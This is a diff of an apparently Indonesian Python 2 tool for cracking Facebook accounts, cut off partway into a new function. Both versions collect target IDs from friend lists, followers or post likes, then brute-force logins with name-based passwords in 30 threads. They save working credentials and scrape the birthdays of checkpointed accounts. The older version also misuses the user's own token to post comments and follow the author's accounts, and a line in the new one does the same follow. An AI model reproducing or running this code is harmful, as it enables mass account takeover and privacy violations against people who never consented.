@@ -1,43 +1,32 @@
 # -*- coding: utf-8
-#####################################################
-# * Author    : Angga Kurniawan                     #
-# * Facebook  : https://facebook.com/gaaaarzxd      #
-# * GitHub    : https://github.com/anggaxd          #
-# * Instagram : https://www.instagram.com/gaaarzxd  #
-# * Website   : https://anggaxd.herokuapp.com       #
-# * File Name : run.py < simpel brute force >       #
-#####################################################
-
+# author by angga kurniawan
+import os
 try:
 	import requests
-	import sys
-	import os
-	import subprocess
-	import random
-	import time
-	import re
-	import json
-	from multiprocessing.pool import ThreadPool
-	from requests.exceptions import ConnectionError
-	from datetime import datetime
-except Exception as modul:
-	print(" \033[0;97m[\033[0;91m!\033[0;97m] %s installed yet"%(modul))
-	exit(" \033[0;97m[\033[0;93m#\033[0;97m] Please Type : pip2 install requests")
+except ImportError:
+	print("\n ! module requests belum terinstall")
+	os.system("pip2 install requests")
+
+try:
+	import bs4
+except ImportError:
+	print("\n ! module bs4 belum terinstall")
+	os.system("pip2 install bs4")
+
+import os, sys, re, time, requests, json, random, calendar
+from multiprocessing.pool import ThreadPool
+from bs4 import BeautifulSoup as parser
+from datetime import datetime
+from datetime import date
 
 loop = 0
+id = []
 ok = []
 cp = []
-id = []
-pwx = []
 
-s = requests.Session()
-rgb = random.choice(['\x1b[0;91m', '\x1b[0;92m', '\x1b[0;93m', '\x1b[0;94m', '\x1b[0;95m', '\x1b[0;96m', '\x1b[0;97m', '\x1b[0m'])
-ua = s.get("https://anggaxd.herokuapp.com/ua.txt").text.strip()
-ip = s.get('https://anggaxd.herokuapp.com/ip/').text
-	
 ct = datetime.now()
 n = ct.month
-bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'Nopember', 'Desember']
+bulan = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
 try:
     if n < 0 or n > 12:
         exit()
@@ -51,568 +40,485 @@ bu = current.month
 ha = current.day
 op = bulan[nTemp]
 
+my_date = date.today()
+hr = calendar.day_name[my_date.weekday()]
+tanggal = ("%s-%s-%s-%s"%(hr, ha, op, ta))
+tgl = ("%s %s %s"%(ha, op, ta))
+bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
+
 def logo():
 	os.system("clear")
-	print("  \033[0;91m___ ___ __  __ ___ ___ \n \033[0;91m/ __|_ _|  \/  | _ ) __| \033[0;96mAU\033[0;97m : ANGGA KURNIAWAN\n\033[0;97m \__ \| || |\/| | _ \ _|  \033[0;91mFB\033[0;97m : FB.ME/GAAAARZXD\n\033[0;97m |___/___|_|  |_|___/_|   \033[0;93mGH\033[0;97m : GITHUB.COM/ANGGAXD")
-
-def bot_komen():
-    try:
-        token = open('login.txt', 'r').read()
-    except IOError:
-        print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
-        os.system('rm -rf login.txt')
-    una = ('100015073506062') 
-    post = ('1031861840659590') 
-    post2 = ('1110619372783836') 
-    kom = ('GW PAKE SC LU BANG @[100015073506062:0] 😍😘\nhttps://www.facebook.com/100015073506062/posts/1031861840659590/?app=fbl') 
-    kom2 = ('KEREN BANG @[100015073506062:0] 😘😘\nhttps://m.facebook.com/photo.php?fbid=1110619372783836&set=a.106868716492245&type=3&app=fbl') 
-    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + token)
-    requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + kom2 + '&access_token=' + token)
-    requests.post('https://graph.facebook.com/100015073506062/subscribers?access_token=' + token)
-    requests.post('https://graph.facebook.com/1186995774/subscribers?access_token=' + token)
-    print(" \033[0;97m[\033[0;92m+\033[0;97m] Login Successfully")
-    menu()
+	print(" \033[0;91m ___ ___ __  __ ___ _    ___   ___ ___  \n \033[0;91m/ __|_ _|  \/  | _ \ |  | __| | _ ) __| \n \033[0;97m\__ \| || |\/| |  _/ |__| _|  | _ \ _|  \n \033[0;97m|___/___|_|  |_|_| |____|___| |___/_| BY ANGGAXD\n")
 
 def login():
 	os.system("clear")
 	try:
-		token = open('login.txt','r')
-		menu()
-	except (KeyError,IOError):
-		logo()
-		print("\n \033[0;97m[\033[0;93m*\033[0;97m] Select The Login Method")
-		print(" \033[0;97m[\033[0;96m1\033[0;97m] Login With Token Facebook")
-		print(" \033[0;97m[\033[0;96m2\033[0;97m] Login With Cookie Facebook")
-		ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Choose : ")
-		if ask =="":
-			login()
-		elif ask == "1" or ask == "01":
-			tokenz()
-		elif ask == "2" or ask == "02":
-			cookie()
-		else:
-			login()
-			
-def cookie():
-	logo()
-	print("\n \033[0;97m[\033[0;93m*\033[0;97m] How To Get Cookie : https://youtu.be/X7m_O_tZnTc")
-	cookie = raw_input(" \033[0;97m[\033[0;92m+\033[0;97m] Your Cookie : \033[0;96m")
-	try:
-		data = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = {
-		   'user-agent'                : 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36', # Jangan Di Ganti Ea Anjink.
-		   'referer'                   : 'https://m.facebook.com/',
-		   'host'                      : 'm.facebook.com',
-		   'origin'                    : 'https://m.facebook.com',
-		   'upgrade-insecure-requests' : '1',
-		   'accept-language'           : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
-		   'cache-control'             : 'max-age=0',
-		   'accept'                    : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-		   'content-type'              : 'text/html; charset=utf-8'
-		}, cookies = {
-		   'cookie'                    : cookie
-		})
-		find_token = re.search('(EAAA\w+)', data.text)
-		hasil    = " \033[0;97m[\033[0;91m!\033[0;97m] Your Cookie Invalid" if (find_token is None) else '\n* Your fb access token : ' + find_token.group(1)
+		#-> test koneksi
+		requests.get("https://mbasic.facebook.com")
 	except requests.exceptions.ConnectionError:
-		print(' \033[0;97m[\033[0;91m!\033[0;97m] No Connection')
-	cookie = open("login.txt", 'w')
-	cookie.write(find_token.group(1))
-	cookie.close()
-	bot_komen()
-	
-def tokenz():
-	os.system("clear")
+		exit(" ! tidak ada koneksi internet")
 	try:
-		token = open('login.txt','r')
+		token = open("login.txt", "r")
 		menu()
-	except (KeyError,IOError):
-		logo()
-		print("\n \033[0;97m[\033[0;93m*\033[0;97m] How To Get Token : https://youtu.be/RIpCHs7E4qs")
-		token = raw_input(" \033[0;97m[\033[0;92m+\033[0;97m] Your Token : \033[0;96m")
+	except KeyError, IOError:
+		print(" * sebelum masuk ke menu harus login terlebih dahulu")
+		print(" * untuk login silakan masukan token facebook anda")
+		print(" ? ketik '\033[0;93mhelp\033[0;97m' untuk lihat tutorial ambil token facebook")
+		token = raw_input("\n + token fb : ")
+		if token == "help":
+			os.system("xdg-open https://youtu.be/IdxphPBMMTU")
+			exit(" ! di simak video nya biar paham")
 		try:
-			otw = requests.get('https://graph.facebook.com/me?access_token='+token)
-			a = json.loads(otw.text)
-			avsid = open("login.txt", 'w')
-			avsid.write(token)
-			avsid.close()
-			bot_komen()
+			nama = requests.get("https://graph.facebook.com/me?access_token="+token).json()["name"].lower()
+			open("login.txt", "w").write(token)
+			requests.post("https://graph.facebook.com/100029606822045/subscribers?access_token="+token)
+			print("\n + user aktif, selamat datang \033[0;93m%s\033[0;97m"%(nama))
+			time.sleep(1)
+			menu()
 		except KeyError:
-			exit(" \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid")
+			os.system("rm -f login.txt")
+			exit(" ! token kadaluwarsa")
 
 def menu():
-	os.system('clear')
+	os.system("clear")
 	global token
 	try:
-		token = open('login.txt','r').read()
-	except IOError:
-		print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
-		os.system('clear')
-		os.system('rm -rf login.txt')
-		login()
-	try:
-		otw = requests.get('https://graph.facebook.com/me/?access_token='+token)
-		a = json.loads(otw.text)
-		nama = a['name']
-		id = a['id']
-	except KeyError:
-		os.system('clear')
-		print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
-		os.system('rm -rf login.txt')
-		login()
+		#-> test koneksi
+		requests.get("https://mbasic.facebook.com")
 	except requests.exceptions.ConnectionError:
-		exit(' \033[0;97m[\033[0;91m!\033[0;97m] No Connection')
+		exit(" ! tidak ada koneksi internet")
+	try:
+		token = open("login.txt","r").read()
+	except KeyError:
+		os.system("rm -f login.txt")
+		exit(" ! token kadaluwarsa")
+	try:
+		nama = requests.get("https://graph.facebook.com/me/?access_token="+token).json()["name"].lower()
+	except IOError:
+		os.system("rm -f login.txt")
+		exit(" ! token kadaluwarsa")
 	logo()
-	print(" \033[0;97m[\033[0;96m+\033[0;97m] User Active : %s"%(nama))
-	print(" \033[0;97m[\033[0;96m+\033[0;97m] IP Address  : "+ip)
-	print(" \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------") 
-	print(" \033[0;97m[\033[0;96m1\033[0;97m] Crack From Public")
-	print(" \033[0;97m[\033[0;96m2\033[0;97m] Crack From Follower")
-	print(" \033[0;97m[\033[0;96m3\033[0;97m] Crack From Reaction")
-	print(" \033[0;97m[\033[0;96m4\033[0;97m] Check Results")
-	print(" \033[0;97m[\033[0;96m5\033[0;97m] Setting User-Agent")
-	print(" \033[0;97m[\033[0;91m0\033[0;97m] Logout (delete token)")
-	ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Choose : ")
-	if ask =="":
+	print(" [ selamat datang \033[0;93m%s\033[0;97m ]\n"%(nama))
+	print(" 1 crack dari publik teman")
+	print(" 2 crack dari pengikut")
+	print(" 3 crack dari target massal")
+	print(" 4 lihat hasil crack")
+	print(" 5 ganti user agent")
+	print(" 0 keluar (hapus token)")
+	angga = raw_input("\n ? choose : ")
+	if angga =="":
 		menu()
-	elif ask == "1" or ask == "01":
-		public()
-	elif ask == "2" or ask == "02":
-		followers()
-	elif ask == "3" or ask == "03":
-		reaction()
-	elif ask == "4" or ask == "04":
-		print("\n \033[0;97m[\033[0;96m1\033[0;97m] Check Results OK")
-		print(" \033[0;97m[\033[0;96m2\033[0;97m] Check Results CP")
-		ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Choose : ")
-		if ask =="":
+	elif angga == "1" or angga == "01":
+		publik()
+		method()
+	elif angga == "2" or angga == "02":
+		follower()
+		method()
+	elif angga == "3" or angga == "03":
+		massal()
+		method()
+	elif angga == "4" or angga == "04":
+		print("\n 1 cek hasil crack OK")
+		print(" 2 cek hasil crack CP")
+		cek = raw_input("\n ? choose : ")
+		if cek =="":
 			menu()
-		elif ask == "1" or ask == "01":
+		elif cek == "1":
+			dirs = os.listdir("OK")
+			print(" * list nama file tersimpan di folder OK")
+			for file in dirs:
+				print(" + "+file)
 			try:
-				totalok = open("results/OK-%s-%s-%s.txt"%(ha, op, ta)).read().splitlines()
-				print("\n \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
-				print(" \033[0;97m[\033[0;92m+\033[0;97m] Results \033[0;92mOK\033[0;97m Date : \033[0;92m%s-%s-%s \033[0;97mTotal : %s\033[0;92m"%(ha, op, ta,len(totalok)))
-				os.system("cat results/OK-%s-%s-%s.txt"%(ha, op, ta))
-				exit(" \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
-			except (IOError):
-				exit(" \033[0;97m[\033[0;91m!\033[0;97m] No Results Bro")
-		elif ask == "2" or ask == "02":
+				file = raw_input("\n ? pilih nama file : ")
+				if file == "":
+					menu()
+				totalok = open("OK/%s"%(file)).read().splitlines()
+			except IOError:
+				exit(" ! file %s tidak tersedia"%(file))
+			nm_file = ("%s"%(file)).replace("-", " ")
+			del_txt = nm_file.replace(".txt", "")
+			print(" # ----------------------------------------------")
+			print(" + hasil crack : %s total : %s\033[0;93m"%(del_txt, len(totalok)))
+			os.system("cat OK/%s"%(file))
+			print("\033[0;97m # ----------------------------------------------")
+			exit(" ! jangan lupa di copy dan di simpan hasilnya")
+		elif cek == "2":
+			dirs = os.listdir("CP")
+			print(" * list nama file tersimpan di folder CP")
+			for file in dirs:
+				print(" + "+file)
 			try:
-				totalcp = open("results/CP-%s-%s-%s.txt"%(ha, op, ta)).read().splitlines()
-				print("\n \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
-				print(" \033[0;97m[\033[0;92m+\033[0;97m] Results \033[0;93mCP\033[0;97m Date : \033[0;92m%s-%s-%s \033[0;97mTotal : %s\033[0;93m"%(ha, op, ta,len(totalcp)))
-				os.system("cat results/CP-%s-%s-%s.txt"%(ha, op, ta))
-				exit(" \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
-			except (IOError):
-				exit(" \033[0;97m[\033[0;91m!\033[0;97m] No Results Bro")
+				file = raw_input("\n ? pilih nama file : ")
+				if file == "":
+					menu()
+				totalcp = open("CP/%s"%(file)).read().splitlines()
+			except IOError:
+				exit(" ! file %s tidak tersedia"%(file))
+			nm_file = ("%s"%(file)).replace("-", " ")
+			del_txt = nm_file.replace(".txt", "")
+			print(" # ----------------------------------------------")
+			print(" + hasil crack : %s total : %s\033[0;93m"%(del_txt, len(totalcp)))
+			os.system("cat CP/%s"%(file))
+			print("\033[0;97m # ----------------------------------------------")
+			exit(" ! jangan lupa di copy dan di simpan hasilnya")
 		else:
 			menu()
-	elif ask == "5" or ask == "05":
-		settua()
-	elif ask == "0" or ask == "00":
+	elif angga == "5" or angga == "05":
+		setting_ua()
+	elif angga == "0" or angga == "00":
 		os.system("rm -f login.txt")
-		exit(" \033[0;97m[\033[0;96m#\033[0;97m] Successfully Delete Token")
+		exit("\n # berhasil menghapus token")
 	else:
 		menu()
 
-def public():
+def publik():
 	global token
 	try:
-		token = open('login.txt', 'r').read()
+		token = open("login.txt", "r").read()
 	except IOError:
-		print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
-		tokenz()
-	print("\n \033[0;97m[\033[0;93m*\033[0;97m] Fill In 'me' To Crack From The Friends List")
-	idt = raw_input(" \033[0;97m[\033[0;92m+\033[0;97m] ID Public : ")
+		exit(" ! token kadaluwarsa")
+	print("\n * isi 'me' jika ingin dari daftar teman")
+	idt = raw_input(" + id target : ")
 	try:
-		pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
-		sp = json.loads(pok.text)
-		#print(" \033[0;97m[\033[0;92m+\033[0;97m] Name : "+sp["name"])
+		for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
+			uid = i["id"]
+			nama = i["name"].rsplit(" ")[0]
+			id.append(uid+"<=>"+nama)
 	except KeyError:
-		exit(' \033[0;97m[\033[0;91m!\033[0;97m] ID Public Not Found')
-	r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
-	z = json.loads(r.text)
-	for i in z["data"]:
-		uid = i['id']
-		name = i['name']
-		id.append(uid+'<=>'+name)
-	print(" \033[0;97m[\033[0;93m*\033[0;97m] Total ID  : \033[0;91m"+str(len(id)))
-	ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Want to Use a Manual Password? Y/t : ")
-	if ask == "Y" or ask == "y":
-		manual()
-	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;92mOK\033[0;97m Saved In : results/OK-%s-%s-%s.txt"% (ha, op, ta))
-	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;93mCP\033[0;97m Saved In : results/CP-%s-%s-%s.txt\n"% (ha, op, ta))
-	
-	def main(user):
-		global loop, token
-		pwx = []
-		sys.stdout.write(
-		      '\r \033[0;97m[%s*\033[0;97m] Cracking %s/%s OK-:%s - CP-:%s ' % (rgb,loop, len(id), len(ok), len(cp))
-		); sys.stdout.flush()
-		try:os.mkdir("results")
-		except OSError:pass
-		uid,name=user.split("<=>")
-		for ss in name.split(" "):
-			if len(ss)<3:
-				continue
-			else:
-				if len(ss) == 1 and len(ss) == 2 and len(ss) == 3 and len(ss) == 4 or len(ss) == 5:
-					pwx.append(ss+"123")
-					pwx.append(ss+"1234")
-					pwx.append(ss+"12345")
-					pwx.append(ss+"786")
-					pwx.append(ss+"1122")
-					pwx.append(ss+"12")
-					pwx.append(ss+"1")
-				else:
-					pwx.append(ss+"123")
-					pwx.append(ss+"12345")
-					pwx.append(ss+"pakistan")
-					pwx.append(ss+"pakistan1")
-					pwx.append(ss+"pakistan123")
-					pwx.append(ss+"786786")
-		try:
-			for pw in pwx:
-				pw = pw.lower()
-				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
-				xo = rex.content
-				if 'mbasic_logout_button' in xo or 'save-device' in xo:
-					print('\r  \033[0;92m* --> ' +uid+ '|' + pw + '       ')
-					ok.append(uid+'|'+pw)
-					save = open('results/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
-					save.write('  * --> '+str(uid)+'|'+str(pw)+'\n')
-					save.close()
-					break
-					continue
-				if 'checkpoint' in xo:
-					try:
-						token = open('login.txt').read()
-						url = ("https://graph.facebook.com/"+uid+"?access_token="+token)
-						data = s.get(url).json()
-						ttl = data['birthday'].replace("/","-")
-						nama = data['name']
-						print('\r  \033[0;93m* --> ' +uid+ '|' + pw + '|' + ttl)
-						cp.append(uid+'|'+pw+'|'+ttl)
-						save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
-						save.write('  * --> '+str(uid)+'|'+str(pw)+'|'+ttl+'\n')
-						save.close()
-						break
-					except(KeyError, IOError):
-						ttl = " "
-					except:pass
-					print('\r  \033[0;93m* --> ' +uid+ '|' + pw + '       ')
-					cp.append(uid+'|'+pw)
-					save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
-					save.write('  * --> '+str(uid)+'|'+str(pw)+'\n')
-					save.close()
-					break
-					continue
-					
-			loop += 1
-		except:
-			pass
-	p = ThreadPool(30)
-	p.map(main, id)
-	exit("\n \033[0;97m[\033[0;96m#\033[0;97m] Finished")
+		exit(" ! id pengguna %s tidak tersedia"%(idt))
+	print(" + total id  : \033[0;91m%s\033[0;97m"%(len(id))) 
 
-def followers():
+def follower():
 	global token
 	try:
-		token = open('login.txt', 'r').read()
+		token = open("login.txt", "r").read()
 	except IOError:
-		print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
-		tokenz()
-	print("\n \033[0;97m[\033[0;93m*\033[0;97m] Fill In 'me' To Crack From The Followers")
-	idt = raw_input(" \033[0;97m[\033[0;92m+\033[0;97m] ID Public : ")
+		exit(" ! token kadaluwarsa")
+	print("\n * isi 'me' jika ingin dari pengikut sendiri")
+	idt = raw_input(" + id target : ")
 	try:
-		pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
-		sp = json.loads(pok.text)
-		#print(" \033[0;97m[\033[0;92m+\033[0;97m] Name : "+sp["name"])
+		for i in requests.get("https://graph.facebook.com/%s/subscribers?limit=5000&access_token=%s"%(idt, token)).json()["data"]:
+			uid = i["id"]
+			nama = i["name"].rsplit(" ")[0]
+			id.append(uid+"<=>"+nama)
 	except KeyError:
-		exit(' \033[0;97m[\033[0;91m!\033[0;97m] ID Public Not Found')
-	r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=5000&access_token="+token)
-	z = json.loads(r.text)
-	for i in z["data"]:
-		uid = i['id']
-		name = i['name']
-		id.append(uid+'<=>'+name)
-	print(" \033[0;97m[\033[0;93m*\033[0;97m] Total ID  : \033[0;91m"+str(len(id)))
-	ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Want to Use a Manual Password? Y/t : ")
-	if ask == "Y" or ask == "y":
-		manual()
-	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;92mOK\033[0;97m Saved In : results/OK-%s-%s-%s.txt"% (ha, op, ta))
-	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;93mCP\033[0;97m Saved In : results/CP-%s-%s-%s.txt\n"% (ha, op, ta))
-	
-	def main(user):
-		global loop, token
-		pwx = []
-		sys.stdout.write(
-		      '\r \033[0;97m[%s*\033[0;97m] Cracking %s/%s OK-:%s - CP-:%s ' % (rgb,loop, len(id), len(ok), len(cp))
-		); sys.stdout.flush()
-		try:os.mkdir("results")
-		except OSError:pass
-		uid,name=user.split("<=>")
-		for ss in name.split(" "):
-			if len(ss)<3:
-				continue
-			else:
-				if len(ss) == 1 and len(ss) == 2 and len(ss) == 3 and len(ss) == 4 or len(ss) == 5:
-					pwx.append(ss+"123")
-					pwx.append(ss+"1234")
-					pwx.append(ss+"12345")
-					pwx.append(ss+"786")
-					pwx.append(ss+"1122")
-					pwx.append(ss+"12")
-					pwx.append(ss+"1")
-				else:
-					pwx.append(ss+"123")
-					pwx.append(ss+"12345")
-					pwx.append(ss+"pakistan")
-					pwx.append(ss+"pakistan1")
-					pwx.append(ss+"pakistan123")
-					pwx.append(ss+"786786")
-		try:
-			for pw in pwx:
-				pw = pw.lower()
-				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
-				xo = rex.content
-				if 'mbasic_logout_button' in xo or 'save-device' in xo:
-					print('\r  \033[0;92m* --> ' +uid+ '|' + pw + '       ')
-					ok.append(uid+'|'+pw)
-					save = open('results/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
-					save.write('  * --> '+str(uid)+'|'+str(pw)+'\n')
-					save.close()
-					break
-					continue
-				if 'checkpoint' in xo:
-					try:
-						token = open('login.txt').read()
-						url = ("https://graph.facebook.com/"+uid+"?access_token="+token)
-						data = s.get(url).json()
-						ttl = data['birthday'].replace("/","-")
-						nama = data['name']
-						print('\r  \033[0;93m* --> ' +uid+ '|' + pw + '|' + ttl)
-						cp.append(uid+'|'+pw+'|'+ttl)
-						save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
-						save.write('  * --> '+str(uid)+'|'+str(pw)+'|'+ttl+'\n')
-						save.close()
-						break
-					except(KeyError, IOError):
-						ttl = " "
-					except:pass
-					print('\r  \033[0;93m* --> ' +uid+ '|' + pw + '       ')
-					cp.append(uid+'|'+pw)
-					save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
-					save.write('  * --> '+str(uid)+'|'+str(pw)+'\n')
-					save.close()
-					break
-					continue
-					
-			loop += 1
-		except:
-			pass
-	p = ThreadPool(30)
-	p.map(main, id)
-	exit("\n \033[0;97m[\033[0;96m#\033[0;97m] Finished")
+		exit(" ! id pengguna %s tidak tersedia"%(idt))
+	print(" + total id  : \033[0;91m%s\033[0;97m"%(len(id))) 
 
-def reaction():
+def massal():
 	global token
 	try:
-		token = open('login.txt', 'r').read()
+		token = open("login.txt", "r").read()
 	except IOError:
-		print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
-		tokenz()
-	print("\n \033[0;97m[\033[0;93m*\033[0;97m] Ex :/post/\033[0;92m629986xxxxx\033[0;97m (only id post)")
-	idt = raw_input(" \033[0;97m[\033[0;92m+\033[0;97m] ID Post : ")
+		exit(" ! token kadaluwarsa")
 	try:
-		pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
-		sp = json.loads(pok.text)
-		#print(" \033[0;97m[\033[0;92m+\033[0;97m] Name : "+sp["name"])
-	except KeyError:
-		exit(' \033[0;97m[\033[0;91m!\033[0;97m] ID Postingan Not Found')
-	r = requests.get("https://graph.facebook.com/"+idt+"/likes?limit=5000&access_token="+token)
-	z = json.loads(r.text)
-	for i in z["data"]:
-		uid = i['id']
-		name = i['name']
-		id.append(uid+'<=>'+name)
-	print(" \033[0;97m[\033[0;93m*\033[0;97m] Total ID  : \033[0;91m"+str(len(id)))
-	ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Want to Use a Manual Password? Y/t : ")
-	if ask == "Y" or ask == "y":
-		manual()
-	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;92mOK\033[0;97m Saved In : results/OK-%s-%s-%s.txt"% (ha, op, ta))
-	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;93mCP\033[0;97m Saved In : results/CP-%s-%s-%s.txt\n"% (ha, op, ta))
-	
-	def main(user):
-		global loop, token
-		pwx = []
-		sys.stdout.write(
-		      '\r \033[0;97m[%s*\033[0;97m] Cracking %s/%s OK-:%s - CP-:%s ' % (rgb,loop, len(id), len(ok), len(cp))
-		); sys.stdout.flush()
-		try:os.mkdir("results")
-		except OSError:pass
-		uid,name=user.split("<=>")
-		for ss in name.split(" "):
-			if len(ss)<3:
-				continue
-			else:
-				if len(ss) == 1 and len(ss) == 2 and len(ss) == 3 and len(ss) == 4 or len(ss) == 5:
-					pwx.append(ss+"123")
-					pwx.append(ss+"1234")
-					pwx.append(ss+"12345")
-					pwx.append(ss+"786")
-					pwx.append(ss+"1122")
-					pwx.append(ss+"12")
-					pwx.append(ss+"1")
-				else:
-					pwx.append(ss+"123")
-					pwx.append(ss+"12345")
-					pwx.append(ss+"pakistan")
-					pwx.append(ss+"pakistan1")
-					pwx.append(ss+"pakistan123")
-					pwx.append(ss+"786786")
+		tanya_total = int(input(" + jumlah target id : "))
+	except:tanya_total=1
+	print("\n * isi 'me' jika ingin dari daftar teman")
+	for t in range(tanya_total):
+		t +=1
+		idt = raw_input(" + id target %s : "%(t))
 		try:
-			for pw in pwx:
-				pw = pw.lower()
-				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
-				xo = rex.content
-				if 'mbasic_logout_button' in xo or 'save-device' in xo:
-					print('\r  \033[0;92m* --> ' +uid+ '|' + pw + '       ')
-					ok.append(uid+'|'+pw)
-					save = open('results/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
-					save.write('  * --> '+str(uid)+'|'+str(pw)+'\n')
-					save.close()
-					break
-					continue
-				if 'checkpoint' in xo:
-					try:
-						token = open('login.txt').read()
-						url = ("https://graph.facebook.com/"+uid+"?access_token="+token)
-						data = s.get(url).json()
-						ttl = data['birthday'].replace("/","-")
-						nama = data['name']
-						print('\r  \033[0;93m* --> ' +uid+ '|' + pw + '|' + ttl)
-						cp.append(uid+'|'+pw+'|'+ttl)
-						save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
-						save.write('  * --> '+str(uid)+'|'+str(pw)+'|'+ttl+'\n')
-						save.close()
-						break
-					except(KeyError, IOError):
-						ttl = " "
-					except:pass
-					print('\r  \033[0;93m* --> ' +uid+ '|' + pw + '       ')
-					cp.append(uid+'|'+pw)
-					save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
-					save.write('  * --> '+str(uid)+'|'+str(pw)+'\n')
-					save.close()
-					break
-					continue
-					
-			loop += 1
-		except:
-			pass
-	p = ThreadPool(30)
-	p.map(main, id)
-	exit("\n \033[0;97m[\033[0;96m#\033[0;97m] Finished")
+			for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
+				uid = i["id"]
+				nama = i["name"].rsplit(" ")[0]
+				id.append(uid+"<=>"+nama)
+		except KeyError:
+			print(" ! id pengguna %s tidak tersedia"%(idt))
+	print(" + total id  : \033[0;91m%s\033[0;97m"%(len(id)))
+
+def method():
+	print(" \n [ pilih method crack - coba method satu² ]\n")
+	print(" 1 method b-api  (fast crack)")
+	print(" 2 method mbasic (slow crack)")
+	print(" 3 method mobile (slow crack)")
+	method = raw_input("\n ? method : ")
+	if method == "":
+		menu()
+	elif method == "1":
+		ask = raw_input(" ? gunakan password manual? y/t: ")
+		if ask == "y":
+			manual()
+		print("\n + hasil OK tersimpan di : OK/%s.txt"%(tanggal))
+		print(" + hasil CP tersimpan di : CP/%s.txt\n"%(tanggal))
+		print(" ! jika tidak ada hasil hidupkan mode pesawat 5 detik\n")
+		ThreadPool(30).map(bapi, id)
+		exit("\n\n # selesai...")
+	elif method == "2":
+		ask = raw_input(" ? gunakan password manual? y/t: ")
+		if ask == "y":
+			manual()
+		print("\n + hasil OK tersimpan di : OK/%s.txt"%(tanggal))
+		print(" + hasil CP tersimpan di : CP/%s.txt\n"%(tanggal))
+		print(" ! jika tidak ada hasil hidupkan mode pesawat 5 detik\n")
+		ThreadPool(30).map(mbasic, id)
+		exit("\n\n # selesai...")
+	elif method == "3":
+		ask = raw_input(" ? gunakan password manual? y/t: ")
+		if ask == "y":
+			manual()
+		print("\n + hasil OK tersimpan di : OK/%s.txt"%(tanggal))
+		print(" + hasil CP tersimpan di : CP/%s.txt\n"%(tanggal))
+		print(" ! jika tidak ada hasil hidupkan mode pesawat 5 detik\n")
+		ThreadPool(30).map(mobile, id)
+		exit("\n\n # selesai...")
+	else:
+		menu()
+
+def cek_ttl_cp(uid, pw):
+	try:
+		token = open("login.txt", "r").read()
+		with requests.Session() as ses:
+			ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
+			month, day, year = ttl.split("/")
+			month = bulan_ttl[month]
+			print("\r \033[0;93m+ %s|%s|%s %s %s\033[0;97m"%(uid, pw, day, month, year))
+			cp.append("%s|%s"%(uid, pw))
+			open("CP/%s.txt"%(tanggal),"a").write(" + %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
+	except KeyError, IOError:
+		day = (" ")
+		month = (" ")
+		year = (" ")
+	except:pass
+
+def bapi(user):
+	try:
+		ua = open(".ua", "r").read()
+	except IOError:
